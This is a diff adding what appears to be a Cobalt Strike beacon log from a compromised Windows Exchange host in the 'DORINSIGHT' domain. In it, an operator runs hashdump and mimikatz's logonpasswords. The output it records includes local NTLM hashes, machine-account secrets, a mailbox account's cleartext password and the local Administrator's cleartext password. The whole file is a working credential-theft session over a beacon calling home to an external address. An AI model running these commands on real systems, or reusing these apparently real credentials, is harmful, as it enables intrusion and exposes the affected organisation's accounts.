@@ -1,0 +1,512 @@
+11/21 20:49:23 UTC [metadata] 195.87.123.122 <- 10.21.0.122; computer: DOR-EXCH; user: SYSTEM *; process: dns2.exe; pid: 19004; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+11/21 20:49:53 UTC [input] <neo> hashdump
+11/21 20:49:53 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+11/21 20:50:19 UTC [checkin] host called home, sent: 83262 bytes
+11/21 20:50:20 UTC [output]
+received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:95d3526749f48370e1326d0582deff37:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Support:1002:aad3b435b51404eeaad3b435b51404ee:47b146508e81e4b2c452bb9dfc78a338:::
+Sys32:1000:aad3b435b51404eeaad3b435b51404ee:765983c872f9526511c32a43c8547631:::
+System32:1001:aad3b435b51404eeaad3b435b51404ee:64fbae31cc352fc26af97cbdef151e03:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5fa5efa891809acd5c0a031e566c437d:::
+
+
+11/21 20:50:51 UTC [input] <neo> logonpasswords
+11/21 20:50:51 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+11/21 20:51:20 UTC [checkin] host called home, sent: 313675 bytes
+11/21 20:51:22 UTC [output]
+received output:
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:07 PM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2929662186 (00000000:ae9f18ea)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/21/2023 9:44:06 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2485959883 (00000000:942cbccb)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox5dc5971
+Domain            : DORINSIGHT
+Logon Server      : DOR-ADC
+Logon Time        : 11/14/2023 3:32:51 PM
+SID               : S-1-5-21-2850448977-925824221-14913260-1136
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 41d708d5553f38f370cf19fa274bd23f
+	 * SHA1     : 25587839e36dd5aa65d74459768fbeb16e0fe830
+	 * DPAPI    : 88597c56cf743f09349fbefe16087499
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT
+	 * Password : tHFEmG]a-bJvkAXGOdJG(+K7j9k/G9xnQ6=E}5^3ZJ@}dl@5B^:u-@eb-hxoVq#3&wq_dq##?E|K;-E9UY9O9P*.GW>XXi5h=GM%F);nAunIr+E8mO]|b=$7tVr4I-Ya
+	kerberos :	
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 48689 (00000000:0000be31)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:04 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 47231 (00000000:0000b87f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:03 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	 [00000000]
+	 * Username : HealthMailbox5dc5971d64a244a88623ff56262a8fd4@dorinsight.local
+	 * Domain   : (null)
+	 * Password : tHFEmG]a-bJvkAXGOdJG(+K7j9k/G9xnQ6=E}5^3ZJ@}dl@5B^:u-@eb-hxoVq#3&wq_dq##?E|K;-E9UY9O9P*.GW>XXi5h=GM%F);nAunIr+E8mO]|b=$7tVr4I-Ya
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:06 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 68121 (00000000:00010a19)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:05 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : bccf69be39bdec69542430389fe6126c
+	 * SHA1     : d60cbcfba80dfe9b8d73acac9b275a16efab69a5
+	 * DPAPI    : d60cbcfba80dfe9b8d73acac9b275a16
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : ca 33 ec ee 08 d3 4d 2d b7 40 cc a7 aa 26 f2 7a 15 f0 ec 8c db 4c a5 9f af 16 36 23 53 5d bb 78 aa 30 30 e9 ed 4a 58 91 aa fc 14 a6 75 cd 6c 04 82 f3 19 dc c7 c7 7a 5f 07 f0 a9 5f ee b4 f1 8f 6b 2b 8b aa a0 74 f9 2a 71 2d 3b ed 2c a6 da b4 b4 36 fe a9 eb 92 52 57 9c 47 40 5d d3 da 54 c9 f9 3f 7a 1d 24 ed 31 57 2d f9 2c f4 96 fb 04 e7 d4 5f 42 70 a3 69 3f 62 7b 33 93 ce 47 5a ce 27 16 da d3 bb aa 5b 52 9f b8 f7 de 91 21 9a 32 e0 99 67 7f 3e b1 61 9b 3d eb a5 5b 74 a8 c0 9d 9b 06 fb 9f 50 e3 d3 2d cd c6 44 b1 c8 6f 86 93 a2 a2 e6 c4 7f de 6c 50 a7 cd e1 ec 0e de 6d 9a 90 0e 66 44 1e 63 00 69 9c 19 a4 d6 6b d9 10 01 2c 60 e8 0b a6 41 86 00 59 0c be 9b 5d e0 db a3 19 91 43 3f 6a 39 87 59 31 99 88 95 4d 54 48 af 88 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : ca 33 ec ee 08 d3 4d 2d b7 40 cc a7 aa 26 f2 7a 15 f0 ec 8c db 4c a5 9f af 16 36 23 53 5d bb 78 aa 30 30 e9 ed 4a 58 91 aa fc 14 a6 75 cd 6c 04 82 f3 19 dc c7 c7 7a 5f 07 f0 a9 5f ee b4 f1 8f 6b 2b 8b aa a0 74 f9 2a 71 2d 3b ed 2c a6 da b4 b4 36 fe a9 eb 92 52 57 9c 47 40 5d d3 da 54 c9 f9 3f 7a 1d 24 ed 31 57 2d f9 2c f4 96 fb 04 e7 d4 5f 42 70 a3 69 3f 62 7b 33 93 ce 47 5a ce 27 16 da d3 bb aa 5b 52 9f b8 f7 de 91 21 9a 32 e0 99 67 7f 3e b1 61 9b 3d eb a5 5b 74 a8 c0 9d 9b 06 fb 9f 50 e3 d3 2d cd c6 44 b1 c8 6f 86 93 a2 a2 e6 c4 7f de 6c 50 a7 cd e1 ec 0e de 6d 9a 90 0e 66 44 1e 63 00 69 9c 19 a4 d6 6b d9 10 01 2c 60 e8 0b a6 41 86 00 59 0c be 9b 5d e0 db a3 19 91 43 3f 6a 39 87 59 31 99 88 95 4d 54 48 af 88 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 923266988 (00000000:3707efac)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox5dc5971
+Domain            : DORINSIGHT
+Logon Server      : DOR-ADC
+Logon Time        : 10/19/2023 9:58:26 AM
+SID               : S-1-5-21-2850448977-925824221-14913260-1136
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 41d708d5553f38f370cf19fa274bd23f
+	 * SHA1     : 25587839e36dd5aa65d74459768fbeb16e0fe830
+	 * DPAPI    : 88597c56cf743f09349fbefe16087499
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT
+	 * Password : tHFEmG]a-bJvkAXGOdJG(+K7j9k/G9xnQ6=E}5^3ZJ@}dl@5B^:u-@eb-hxoVq#3&wq_dq##?E|K;-E9UY9O9P*.GW>XXi5h=GM%F);nAunIr+E8mO]|b=$7tVr4I-Ya
+	kerberos :	
+	 * Username : HealthMailbox5dc5971
+	 * Domain   : DORINSIGHT.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2187594302 (00000000:82640a3e)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 11/9/2023 7:25:14 PM
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 48637 (00000000:0000bdfd)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:04 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DOR-EXCH$
+Domain            : DORINSIGHT
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:03 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : dor-exch$
+	 * Domain   : DORINSIGHT.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 64415838 (00000000:03d6e85e)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : DOR-EXCH
+Logon Server      : DOR-EXCH
+Logon Time        : 10/4/2023 2:12:49 PM
+SID               : S-1-5-21-4129927937-504839339-1035754421-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : DOR-EXCH
+	 * NTLM     : 95d3526749f48370e1326d0582deff37
+	 * SHA1     : 1bf1f4c1dd6eae66d4f2d5c52304b0f0d1725d0b
+	 * DPAPI    : 1bf1f4c1dd6eae66d4f2d5c52304b0f0
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : DOR-EXCH
+	 * Password : Password!321
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : DOR-EXCH
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DOR-EXCH$
+Domain            : DORINSIGHT
+Logon Server      : (null)
+Logon Time        : 10/3/2023 3:29:04 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : dor-exch$
+	 * Domain   : DORINSIGHT.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2929662382 (00000000:ae9f19ae)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/21/2023 9:44:06 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * NTLM     : 163ebfb7d3a42d8c60e8ce9deb8aac97
+	 * SHA1     : daefb55c573ddd27113f0571e55996da9ed57662
+	 * DPAPI    : daefb55c573ddd27113f0571e55996da
+	tspkg :	
+	wdigest :	
+	 * Username : DOR-EXCH$
+	 * Domain   : DORINSIGHT
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	kerberos :	
+	 * Username : DOR-EXCH$
+	 * Domain   : dorinsight.local
+	 * Password : 1e 3a ff 8c b7 79 ab 84 ba 8a 9c d0 d0 7f f5 f4 af 06 94 20 fe f0 aa 75 ab 75 d9 c9 90 6b ca 4c 28 97 75 aa 4a 1e 92 a9 12 8c 16 82 e6 40 0f d9 15 f1 28 df 5d 22 15 6f 1b 25 70 84 e0 a8 7c c3 52 f9 ed 95 4b 49 ba c3 63 c8 c3 11 a5 8e 9e 87 04 97 2f c2 8f 51 94 bd d6 16 ab 35 ee 3d 32 77 bb 65 7f 70 58 56 3c ad 2a 05 c2 d9 f7 69 b4 45 5d 5b 76 cb 4a c3 e9 18 5a 37 b1 b3 20 93 a7 e2 2d 49 71 41 a7 46 ea 55 f8 a2 54 76 98 77 bd 43 8a 03 64 04 b6 10 33 80 5a 1e 11 4f fe a4 d4 24 1f 6b 09 de 9f 14 3e 7d 2c 24 a2 89 f3 73 f0 dc cf 6a c5 b6 2c 7e 10 fb 09 88 5e 31 ae a8 d5 aa 8b 12 4d ea cb e0 a9 69 57 10 7d e9 0d c0 b8 4d e9 ed 64 17 a4 e5 62 b5 f8 45 f8 0e 25 bf 6c c9 1b a7 2b cd fe 9c 5a e2 7e a4 ae b9 dd 5a 9b 27 
+	ssp :	
+	credman :	
+	cloudap :	
+
